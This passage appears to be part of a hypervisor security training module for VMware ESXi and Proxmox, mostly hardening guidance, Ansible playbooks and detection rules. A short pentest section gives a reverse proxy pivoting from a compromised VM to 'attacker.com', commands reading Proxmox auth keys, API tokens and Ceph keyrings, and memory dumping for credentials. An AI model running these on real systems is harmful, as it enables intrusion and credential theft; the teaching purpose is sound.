├── Device emulation: target virtual hardware bugs (NIC, disk controller)
├── Paravirtual interfaces: VMCI, vsock, virtio-* shared memory
├── Side channels: cache timing, TLB, branch predictor
├── Shared services: guest agent, clipboard, drag-drop
└── Hardware passthrough: DMA attacks via passed-through devices

PHASE 3: Exploitation Vectors
├── Device emulation overflow: fuzzing virtual hardware I/O ports
├── Memory corruption via paravirtual driver: malformed descriptors
├── Side-channel data extraction: Spectre/MDS variants
├── Guest agent exploitation: command injection, path traversal
└── IOMMU bypass: DMA remapping bugs (rare, high complexity)

PHASE 4: Post-Escape
├── Identify host OS/hypervisor kernel
├── Escalate privileges on host
├── Access other VMs via hypervisor API
├── Extract encryption keys from host memory
└── Pivot to management plane (vCenter/pveproxy)
```

### 9.5 Tools for Hypervisor Penetration Testing

```bash
# rpivot — reverse SOCKS proxy for pivoting through VM to management network
# https://github.com/klsecservices/rpivot
# Use case: compromised guest VM → pivot to management VLAN

# On attacker (listening):
python server.py --server-port 9999 --server-ip 0.0.0.0

# On compromised VM (connecting back):
python client.py --server-ip attacker.com --server-port 9999

# Then route traffic through SOCKS proxy to reach management interfaces

# VMware-specific tools:
# - vSphere-Enumerator: Enumerate vCenter objects post-auth
# - VMwareExploit: Collection of VMware-specific exploit modules
# - viern: ESXi vulnerability scanner

# QEMU/KVM specific:
# - qemu-fuzz: Coverage-guided fuzzing of QEMU device emulation
# - virtio-fuzzer: Fuzz virtio descriptors
# - kvm-ioctls fuzzer: Target KVM kernel interface

# General hypervisor security testing:
# - Volatility: Memory forensics of hypervisor
# - LibVMI: Virtual machine introspection library
# - HyperDbg: Hypervisor-level debugger

# Automated vulnerability scanning:
nmap --script=vmware-version,vulners -p 443 esxi-host
nuclei -t cves/ -target https://vcenter:443 -tags vmware
```

### 9.6 Post-Exploitation in Virtualized Environments

```bash
# After gaining ESXi root access:
# Extract VM encryption keys
vim-cmd vmsvc/getallvms  # List all VMs
grep -r "encryption.key" /vmfs/volumes/  # Find key references

# Access VM memory (live forensics or credential extraction)
# VM memory file: /vmfs/volumes/<datastore>/<vm>/<vm>.vmem (suspended)
# Running VM memory via debug mode:
vim-cmd vmsvc/vm.create_debug_snapshot <vmid>

# After gaining Proxmox root:
# Access QEMU process memory (contains VM RAM)
gcore $(pgrep -f "qemu.*vm-100")
# Parse the core dump for credentials

# Extract API tokens from config
cat /etc/pve/priv/authkey.key  # Cluster authentication key
cat /etc/pve/user.cfg  # User database
ls /etc/pve/priv/token.cfg  # API tokens

# Ceph keyring extraction (full storage access)
cat /etc/pve/priv/ceph/<pool>.keyring
```

---

## 10. Defense-in-Depth Architecture

### 10.1 Layered Security Model

```
┌─────────────────────────────────────────────────────────────┐
│  LAYER 7: MONITORING & RESPONSE                             │
│  SIEM, IDS/IPS, anomaly detection, incident response        │
├─────────────────────────────────────────────────────────────┤
│  LAYER 6: APPLICATION SECURITY                              │
│  Guest OS hardening, endpoint protection, patching          │
├─────────────────────────────────────────────────────────────┤
│  LAYER 5: VM ISOLATION                                      │
│  vTPM, VBS, seccomp, AppArmor, memory isolation             │
├─────────────────────────────────────────────────────────────┤
│  LAYER 4: NETWORK SEGMENTATION                              │
│  Microsegmentation, PVLAN, encrypted vMotion, SDN           │
├─────────────────────────────────────────────────────────────┤
│  LAYER 3: STORAGE ENCRYPTION                                │
│  LUKS, vSAN DAR/DIT, Ceph encryption, KMS                  │
├─────────────────────────────────────────────────────────────┤
│  LAYER 2: HYPERVISOR HARDENING                              │
│  Minimal services, lockdown, patching, audit                │
├─────────────────────────────────────────────────────────────┤
│  LAYER 1: MANAGEMENT PLANE PROTECTION                       │
│  PAM, jump host, 2FA, TLS, RBAC, API scoping               │
├─────────────────────────────────────────────────────────────┤
│  LAYER 0: HARDWARE ROOT OF TRUST                            │
│  TPM 2.0, Secure Boot, IOMMU, HSM, firmware integrity       │
└─────────────────────────────────────────────────────────────┘
```

### 10.2 Jump Hosts and PAM for Management Access

```bash
# Architecture: Admin → Jump Host (hardened) → Hypervisor Management
# Never expose hypervisor management directly to corporate LAN

# Jump host configuration (Debian/Ubuntu):
# /etc/ssh/sshd_config on jump host
Port 2222
ListenAddress 10.0.1.5
PermitRootLogin no
PasswordAuthentication no
AuthenticationMethods publickey,keyboard-interactive
PubkeyAuthentication yes
AllowGroups hypervisor-admins
MaxAuthTries 3
ClientAliveInterval 180
ClientAliveCountMax 2

# PAM configuration for MFA on jump host
# /etc/pam.d/sshd
auth required pam_google_authenticator.so nullok
auth required pam_unix.so

# Session recording (for audit trail)
# Install asciinema or script recording
cat >> /etc/profile.d/session-record.sh << 'EOF'
if [ -n "$SSH_CONNECTION" ] && [ "$TERM" != "dumb" ]; then
  LOGDIR="/var/log/sessions"
  LOGFILE="$LOGDIR/$(whoami)_$(date +%Y%m%d_%H%M%S)_$$.log"
  mkdir -p "$LOGDIR"
  script -qf "$LOGFILE"
  exit
fi
EOF
```

**Privileged Access Management (PAM) integration:**

```yaml
# HashiCorp Boundary configuration for hypervisor access
# boundary-config.hcl concept:
resource "boundary_target" "proxmox_mgmt" {
  name         = "proxmox-management"
  type         = "ssh"
  scope_id     = boundary_scope.infra.id
  address      = "10.0.1.30"
  default_port = 22

  # Injected credentials (SSH cert) — no standing access
  credential_library_ids = [boundary_credential_library.ssh_proxmox.id]

  # Session recording
  enable_session_recording = true
  storage_bucket_id        = boundary_storage_bucket.sessions.id

  # Time-limited access (2 hours max)
  session_max_seconds       = 7200
  session_connection_limit  = 2
}
```

### 10.3 Network Segmentation of Management Traffic

```bash
# Reference architecture: physically or logically isolated management network

# Network zones:
# VLAN 10: Management (hypervisor mgmt, vCenter, pveproxy)
# VLAN 20: vMotion / Live Migration (dedicated, no routing)
# VLAN 30: Storage (iSCSI, NFS, Ceph cluster)
# VLAN 40: Tenant A workloads
# VLAN 50: Tenant B workloads
# VLAN 100: Corosync/cluster communication

# Firewall rules between zones (on perimeter firewall):
# Management zone → Internet: DENY ALL
# Management zone → Workload zones: only monitoring (SNMP/Prometheus)
# Workload zones → Management zone: DENY ALL
# vMotion zone: no default gateway, no routing (L2 only)
# Storage zone: no default gateway, only hypervisor IPs allowed

# Proxmox: Dedicated interfaces per zone
# /etc/network/interfaces
auto eno1
iface eno1 inet manual

auto eno2
iface eno2 inet manual

auto eno3
iface eno3 inet manual

auto eno4
iface eno4 inet manual

# Management bridge (VLAN 10)
auto vmbr0
iface vmbr0 inet static
    address 10.10.0.11/24
    gateway 10.10.0.1
    bridge-ports eno1
    bridge-stp off

# vMotion / Migration (VLAN 20) — no gateway
auto vmbr1
iface vmbr1 inet static
    address 10.20.0.11/24
    bridge-ports eno2
    bridge-stp off
    # No gateway — isolated L2

# Storage (VLAN 30) — no gateway, jumbo frames
auto vmbr2
iface vmbr2 inet static
    address 10.30.0.11/24
    bridge-ports eno3
    bridge-stp off
    mtu 9000

# Workload bridge (VLAN-aware, trunked)
auto vmbr3
iface vmbr3 inet manual
    bridge-ports eno4
    bridge-stp off
    bridge-vlan-aware yes
    bridge-vids 40-99
```

### 10.4 Hardware Security Module (HSM) Integration

```bash
# HSM integration for hypervisor key management
# Use case: VM encryption keys, Ceph encryption, TLS private keys

# PKCS#11 integration with Proxmox (for TLS certificate private key in HSM)
# Install OpenSC and PKCS#11 module for your HSM (e.g., Thales Luna, YubiHSM)
apt install opensc libengine-pkcs11-openssl

# Store pveproxy TLS private key in HSM
# /etc/pve/local/pveproxy-ssl.key → reference HSM slot instead

# YubiHSM 2 example (cost-effective HSM for small deployments):
yubihsm-connector -d
yubihsm-shell
> connect
> session open 1 <password>
> generate asymmetric 0 0 rsa2048-key 1 sign-pkcs:decrypt-pkcs rsa2048

# ESXi: Native KMS integration (KMIP protocol)
# Configure in vCenter: Menu → Host → Cluster → Configure → Key Providers
# Supported KMS: Thales CipherTrust, Entrust KeyControl, HashiCorp Vault Enterprise
# Vault Enterprise KMIP setup:
vault secrets enable kmip
vault write kmip/config listen_addrs=0.0.0.0:5696
vault write kmip/scope/vsphere -f
vault write kmip/scope/vsphere/role/admin \
  operation_activate=true operation_create=true \
  operation_destroy=true operation_get=true
vault read kmip/scope/vsphere/role/admin/credential/generate \
  format=pem
# Import generated cert into vCenter Key Provider config
```

### 10.5 Immutable Infrastructure Patterns

```bash
# Concept: Hypervisor hosts are cattle, not pets
# Any host can be wiped and redeployed from a known-good image

# Proxmox: Automated deployment via PXE + Ansible
# 1. PXE boot with preseed/autoinstaller
# 2. Ansible applies hardening configuration
# 3. Host joins cluster automatically
# 4. VMs migrate to new host via HA/live migration

# Detect drift: compare running config to desired state
ansible-playbook -i inventory.yml check-drift.yml --check --diff
```

**Ansible playbook for Proxmox hardening (full example):**

```yaml
---
# ansible/playbooks/proxmox-hardening.yml
- name: Harden Proxmox VE Hosts
  hosts: proxmox_cluster
  become: true
  vars:
    management_network: "10.10.0.0/24"
    jump_host_ip: "10.10.0.5"
    siem_server: "siem.corp.local"
    ntp_servers:
      - "10.10.0.1"
      - "10.10.0.2"
    ssh_allowed_users: "root ansible-svc"
    tls_min_version: "TLSv1.2"

  tasks:
    # --- SSH Hardening ---
    - name: Harden SSH configuration
      ansible.builtin.lineinfile:
        path: /etc/ssh/sshd_config
        regexp: "{{ item.regexp }}"
        line: "{{ item.line }}"
        state: present
      loop:
        - { regexp: '^#?PermitRootLogin', line: 'PermitRootLogin prohibit-password' }
        - { regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication no' }
        - { regexp: '^#?X11Forwarding', line: 'X11Forwarding no' }
        - { regexp: '^#?MaxAuthTries', line: 'MaxAuthTries 3' }
        - { regexp: '^#?ClientAliveInterval', line: 'ClientAliveInterval 300' }
        - { regexp: '^#?ClientAliveCountMax', line: 'ClientAliveCountMax 2' }
        - { regexp: '^#?AllowUsers', line: 'AllowUsers {{ ssh_allowed_users }}' }
        - { regexp: '^#?Protocol', line: 'Protocol 2' }
        - { regexp: '^#?LoginGraceTime', line: 'LoginGraceTime 30' }
      notify: Restart SSH

    # --- pveproxy TLS Hardening ---
    - name: Configure pveproxy TLS
      ansible.builtin.copy:
        dest: /etc/default/pveproxy
        content: |
          CIPHERS="ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
          HONOR_CIPHER_ORDER=1
          TLS_OPTIONS="NO_SSLv3,NO_TLSv1,NO_TLSv1_1"
        mode: '0644'
      notify: Restart pveproxy

    # --- Firewall Configuration ---
    - name: Enable Proxmox firewall at datacenter level
      ansible.builtin.template:
        src: templates/cluster.fw.j2
        dest: /etc/pve/firewall/cluster.fw
        mode: '0640'

    - name: Enable Proxmox firewall at host level
      ansible.builtin.template:
        src: templates/host.fw.j2
        dest: "/etc/pve/nodes/{{ ansible_hostname }}/host.fw"
        mode: '0640'

    # --- Disable Unnecessary Services ---
    - name: Disable and mask unnecessary services
      ansible.builtin.systemd:
        name: "{{ item }}"
        state: stopped
        enabled: false
        masked: true
      loop:
        - rpcbind
        - rpcbind.socket
      ignore_errors: true

    # --- Sysctl Hardening ---
    - name: Apply security sysctl settings
      ansible.posix.sysctl:
        name: "{{ item.key }}"
        value: "{{ item.value }}"
        sysctl_file: /etc/sysctl.d/99-security-hardening.conf
        reload: true
      loop:
        - { key: "net.ipv4.conf.all.rp_filter", value: "1" }
        - { key: "net.ipv4.conf.default.rp_filter", value: "1" }
        - { key: "net.ipv4.conf.all.accept_source_route", value: "0" }
        - { key: "net.ipv4.conf.all.accept_redirects", value: "0" }
        - { key: "net.ipv4.conf.all.send_redirects", value: "0" }
        - { key: "net.ipv4.conf.all.log_martians", value: "1" }
        - { key: "net.ipv4.icmp_echo_ignore_broadcasts", value: "1" }
        - { key: "net.ipv4.tcp_syncookies", value: "1" }
        - { key: "net.ipv6.conf.all.accept_ra", value: "0" }
        - { key: "net.ipv6.conf.default.accept_ra", value: "0" }
        - { key: "kernel.dmesg_restrict", value: "1" }
        - { key: "kernel.kptr_restrict", value: "2" }
        - { key: "kernel.yama.ptrace_scope", value: "2" }
        - { key: "vm.ksm.run", value: "0" }  # Disable KSM (side-channel risk)
        - { key: "fs.protected_hardlinks", value: "1" }
        - { key: "fs.protected_symlinks", value: "1" }

    # --- NTP Configuration ---
    - name: Configure chrony for time sync
      ansible.builtin.template:
        src: templates/chrony.conf.j2
        dest: /etc/chrony/chrony.conf
        mode: '0644'
      notify: Restart chrony

    # --- Syslog Forwarding ---
    - name: Configure syslog forwarding to SIEM
      ansible.builtin.template:
        src: templates/rsyslog-siem.conf.j2
        dest: /etc/rsyslog.d/50-remote-siem.conf
        mode: '0644'
      notify: Restart rsyslog

    # --- Kernel Module Blacklisting ---
    - name: Blacklist unnecessary kernel modules
      ansible.builtin.copy:
        dest: /etc/modprobe.d/blacklist-hardening.conf
        content: |
          # Disable unused network protocols
          blacklist dccp
          blacklist sctp
          blacklist rds
          blacklist tipc
          # Disable unused filesystems
          blacklist cramfs
          blacklist freevxfs
          blacklist jffs2
          blacklist hfs
          blacklist hfsplus
          blacklist squashfs
          blacklist udf
          # Disable USB storage (if not needed)
          # blacklist usb-storage
        mode: '0644'

    # --- Automatic Security Updates ---
    - name: Install unattended-upgrades for security patches
      ansible.builtin.apt:
        name: unattended-upgrades
        state: present

    - name: Configure unattended-upgrades for security only
      ansible.builtin.copy:
        dest: /etc/apt/apt.conf.d/50unattended-upgrades
        content: |
          Unattended-Upgrade::Allowed-Origins {
            "${distro_id}:${distro_codename}-security";
          };
          Unattended-Upgrade::Remove-Unused-Kernel-Packages "true";
          Unattended-Upgrade::Remove-Unused-Dependencies "true";
          Unattended-Upgrade::Automatic-Reboot "false";
          Unattended-Upgrade::Mail "admin@corp.local";
        mode: '0644'

    # --- Fail2ban for Brute Force Protection ---
    - name: Install and configure fail2ban
      ansible.builtin.apt:
        name: fail2ban
        state: present

    - name: Configure fail2ban for Proxmox
      ansible.builtin.copy:
        dest: /etc/fail2ban/jail.d/proxmox.conf
        content: |
          [proxmox]
          enabled = true
          port = https,8006
          filter = proxmox
          backend = systemd
          maxretry = 3
          findtime = 600
          bantime = 3600
          action = iptables-allports[name=proxmox]
        mode: '0644'

    - name: Create fail2ban filter for Proxmox
      ansible.builtin.copy:
        dest: /etc/fail2ban/filter.d/proxmox.conf
        content: |
          [Definition]
          failregex = pvedaemon\[.*authentication failure; rhost=<HOST> user=.* msg=.*
          ignoreregex =
        mode: '0644'
      notify: Restart fail2ban

  handlers:
    - name: Restart SSH
      ansible.builtin.systemd:
        name: sshd
        state: restarted

    - name: Restart pveproxy
      ansible.builtin.systemd:
        name: pveproxy
        state: restarted

    - name: Restart chrony
      ansible.builtin.systemd:
        name: chrony
        state: restarted

    - name: Restart rsyslog
      ansible.builtin.systemd:
        name: rsyslog
        state: restarted

    - name: Restart fail2ban
      ansible.builtin.systemd:
        name: fail2ban
        state: restarted
```

**Ansible playbook for ESXi hardening via PowerCLI:**

```yaml
---
# ansible/playbooks/esxi-hardening.yml
- name: Harden ESXi Hosts via PowerCLI
  hosts: localhost
  gather_facts: false
  vars:
    vcenter_hostname: "vcenter.corp.local"
    vcenter_username: "administrator@vsphere.local"
    vcenter_password: "{{ vault_vcenter_password }}"
    cluster_name: "Production"

  tasks:
    - name: Disable SSH on all hosts
      community.vmware.vmware_host_service_manager:
        hostname: "{{ vcenter_hostname }}"
        username: "{{ vcenter_username }}"
        password: "{{ vcenter_password }}"
        validate_certs: true
        esxi_hostname: "{{ item }}"
        service_name: TSM-SSH
        state: absent
        service_policy: off
      loop: "{{ groups['esxi_hosts'] }}"

    - name: Disable SLP on all hosts
      community.vmware.vmware_host_service_manager:
        hostname: "{{ vcenter_hostname }}"
        username: "{{ vcenter_username }}"
        password: "{{ vcenter_password }}"
        validate_certs: true
        esxi_hostname: "{{ item }}"
        service_name: slpd
        state: absent
        service_policy: off
      loop: "{{ groups['esxi_hosts'] }}"

    - name: Configure NTP
      community.vmware.vmware_host_ntp:
        hostname: "{{ vcenter_hostname }}"
        username: "{{ vcenter_username }}"
        password: "{{ vcenter_password }}"
        validate_certs: true
        esxi_hostname: "{{ item }}"
        ntp_servers:
          - "10.10.0.1"
          - "10.10.0.2"
        state: present
      loop: "{{ groups['esxi_hosts'] }}"

    - name: Set ESXi shell timeout
      community.vmware.vmware_host_config_manager:
        hostname: "{{ vcenter_hostname }}"
        username: "{{ vcenter_username }}"
        password: "{{ vcenter_password }}"
        validate_certs: true
        esxi_hostname: "{{ item }}"
        options:
          UserVars.ESXiShellInteractiveTimeOut: 900
          UserVars.ESXiShellTimeOut: 3600
          UserVars.SuppressShellWarning: 0
          Security.AccountLockFailures: 5
          Security.AccountUnlockTime: 900
          Config.HostAgent.plugins.solo.enableMob: false
          Mem.ShareForceSalting: 2
      loop: "{{ groups['esxi_hosts'] }}"

    - name: Configure vSwitch security policies
      community.vmware.vmware_vswitch:
        hostname: "{{ vcenter_hostname }}"
        username: "{{ vcenter_username }}"
        password: "{{ vcenter_password }}"
        validate_certs: true
        esxi_hostname: "{{ item }}"
        switch_name: vSwitch0
        security:
          promiscuous_mode: false
          mac_changes: false
          forged_transmits: false
      loop: "{{ groups['esxi_hosts'] }}"

    - name: Enable lockdown mode
      community.vmware.vmware_host_lockdown:
        hostname: "{{ vcenter_hostname }}"
        username: "{{ vcenter_username }}"
        password: "{{ vcenter_password }}"
        validate_certs: true
        esxi_hostname: "{{ item }}"
        state: normal
      loop: "{{ groups['esxi_hosts'] }}"

    - name: Ensure syslog is configured
      community.vmware.vmware_host_config_manager:
        hostname: "{{ vcenter_hostname }}"
        username: "{{ vcenter_username }}"
        password: "{{ vcenter_password }}"
        validate_certs: true
        esxi_hostname: "{{ item }}"
        options:
          Syslog.global.logHost: "ssl://siem.corp.local:6514"
      loop: "{{ groups['esxi_hosts'] }}"
```

### 10.6 Comprehensive Security Monitoring Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                    SECURITY MONITORING STACK                       │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────┐    ┌──────────────┐    ┌────────────────┐     │
│  │ Hypervisor  │    │  Syslog/     │    │   SIEM         │     │
│  │ Logs        │───>│  Journald    │───>│   (Wazuh/ELK/  │     │
│  │ (pvedaemon, │    │              │    │    Splunk)      │     │
│  │  esxi.log)  │    └──────────────┘    └───────┬────────┘     │
│  └─────────────┘                                │              │
│                                                  │              │
│  ┌─────────────┐    ┌──────────────┐    ┌──────▼────────┐     │
│  │ Network     │    │  IDS/IPS     │    │  Alerting &   │     │
│  │ Traffic     │───>│  (Suricata/  │───>│  Correlation  │     │
│  │ (SPAN/TAP)  │    │   Zeek)      │    │               │     │
│  └─────────────┘    └──────────────┘    └───────┬────────┘     │
│                                                  │              │
│  ┌─────────────┐    ┌──────────────┐    ┌──────▼────────┐     │
│  │ VM Behavior │    │  Host-based  │    │  Incident     │     │
│  │ Metrics     │───>│  Detection   │───>│  Response     │     │
│  │ (Prometheus)│    │  (OSSEC/     │    │  Playbooks    │     │
│  └─────────────┘    │   Wazuh)     │    └───────────────┘     │
│                      └──────────────┘                           │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

**Detection rules for hypervisor-specific threats:**

```yaml
# Wazuh/OSSEC rules for Proxmox
# /var/ossec/etc/rules/proxmox_rules.xml (concept)
# Rule: Detect multiple failed auth attempts (brute force)
# - level: 10
#   match: "authentication failure"
#   frequency: 5
#   timeframe: 120
#   description: "Proxmox brute force attack detected"

# Rule: Detect API token creation (privilege escalation indicator)
# - level: 8
#   match: "user token add"
#   description: "New API token created — verify authorization"

# Rule: Detect VM config change (potential persistence)
# - level: 7
#   match: "qm set|pct set"
#   description: "VM configuration modified"

# Prometheus alerting rules for anomaly detection
# /etc/prometheus/rules/hypervisor-security.yml
groups:
  - name: hypervisor_security
    rules:
      - alert: UnexpectedSSHConnection
        expr: node_netstat_Tcp_CurrEstab{job="proxmox",port="22"} > 0
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "SSH connection detected on {{ $labels.instance }}"

      - alert: HighCPUVMExit
        expr: rate(kvm_exits_total[5m]) > 100000
        for: 10m
        labels:
          severity: warning
        annotations:
          summary: "Abnormal VM exit rate — possible side-channel attack"

      - alert: UnexpectedProcessOnHost
        expr: changes(node_procs_running{job="proxmox"}[5m]) > 10
        for: 2m
        labels:
          severity: critical
        annotations:
          summary: "Unexpected process spawn on hypervisor host"
```

---

## Summary: Hardening Priority Matrix

For organizations migrating from VMware to Proxmox, or maintaining hybrid environments, implement controls in this priority order:

| Priority | Action | Impact | Effort |
|----------|--------|--------|--------|
| P0 (Immediate) | Disable SLP/CIM/SNMP on ESXi | Eliminates critical RCE vectors | Low |
| P0 (Immediate) | Enable firewall (both platforms) | Network attack surface reduction | Low |
| P0 (Immediate) | Enforce MFA on management access | Prevents credential-based compromise | Low |
| P1 (Week 1) | Configure syslog forwarding | Enables detection and forensics | Medium |
| P1 (Week 1) | Restrict SSH to jump host only | Eliminates direct management access | Low |
| P1 (Week 1) | Disable inter-VM TPS/KSM | Eliminates side-channel vector | Low |
| P2 (Month 1) | Implement RBAC with least privilege | Limits blast radius of compromise | Medium |
| P2 (Month 1) | Enable storage encryption | Protects data at rest | Medium |
| P2 (Month 1) | Deploy vTPM for sensitive VMs | Enables guest-level security features | Medium |
| P3 (Quarter 1) | CIS Benchmark full compliance | Systematic hardening verification | High |
| P3 (Quarter 1) | Microsegmentation (SDN/NSX) | Prevents lateral movement | High |
| P3 (Quarter 1) | HSM integration for key management | Hardware-backed key protection | High |
| P4 (Ongoing) | Penetration testing (quarterly) | Validates all controls | Medium |
| P4 (Ongoing) | Patch within 72h of critical CVE | Maintains security posture | Medium |

---

## References and Further Reading

- CIS Benchmarks: VMware ESXi 7.0 v1.3.0 (2023-11), VMware ESXi 8.0 v1.0.0 (2023-06)
- DISA STIG: VMware vSphere 7.0 ESXi V1R3, VMware vSphere 8.0 ESXi V1R1
- NIST SP 800-125: Guide to Security for Full Virtualization Technologies
- NIST SP 800-125A: Security Recommendations for Server-Based Hypervisor Platforms
- VMware Security Configuration Guide (SCG) — vSphere 8
- Proxmox VE Administration Guide — Chapter 15: Firewall
- Proxmox VE Administration Guide — Chapter 14: User Management
- MITRE ATT&CK: Virtualization/Sandbox Evasion (T1497), Hypervisor (T1564.006)
- CVE Details: VMware ESXi historical CVE database
- Intel Security Advisories: INTEL-SA-00115 (L1TF), INTEL-SA-00088 (Spectre)

---

## Auto-valutazione

1. Descrivere tre CVE storici che hanno permesso escape da VM a hypervisor e spiegare le root cause comuni.
2. Configurare lockdown mode strict su ESXi e spiegare le implicazioni operative per disaster recovery.
3. Implementare un RBAC Proxmox con separazione dei ruoli per: operatore VM, amministratore rete, operatore backup.
4. Progettare una rete virtuale con microsegmentazione che isoli workload multi-tenant impedendo lateral movement.
5. Spiegare la differenza tra encryption at-rest via LUKS (Proxmox) e vSAN DAR (ESXi) in termini di key management.
6. Condurre una ricognizione di un hypervisor management plane e identificare almeno 5 finding di sicurezza.
7. Scrivere un playbook Ansible che implementi i controlli CIS ESXi Level 1 e produca un report di compliance.
8. Progettare un'architettura defense-in-depth per un cluster Proxmox a 5 nodi che ospita workload PCI-DSS.

---

## Glossario locale

| Termine | Definizione |
|---------|-------------|
| VBS | Virtualization Based Security — Windows feature using hypervisor to isolate credential store |
| vTA | vSphere Trust Authority — separates trust infrastructure from workload clusters |
| KSM | Kernel Samepage Merging — Linux memory deduplication (security risk in multi-tenant) |
| TPS | Transparent Page Sharing — ESXi memory deduplication (equivalent risk to KSM) |
| PVLAN | Private VLAN — L2 isolation within same VLAN (promiscuous/isolated/community) |
| SLP | Service Location Protocol — network service discovery (major ESXi attack vector) |
| KMIP | Key Management Interoperability Protocol — standard for KMS communication |
| vTPM | Virtual Trusted Platform Module — software TPM exposed to guest VM |
| DFW | Distributed Firewall — per-vNIC firewall enforcement (NSX-T feature) |
| L1TF | L1 Terminal Fault — Intel CPU side-channel affecting hypervisor isolation |
| IOMMU | Input/Output Memory Management Unit — hardware DMA isolation (VT-d/AMD-Vi) |
| SR-IOV | Single Root I/O Virtualization — hardware NIC virtualization at PCIe level |
| HSM | Hardware Security Module — dedicated crypto processor for key protection |
| PAM | Privileged Access Management — controls and audits administrative access |
| DAR | Data At Rest (encryption) |
| DIT | Data In Transit (encryption) |
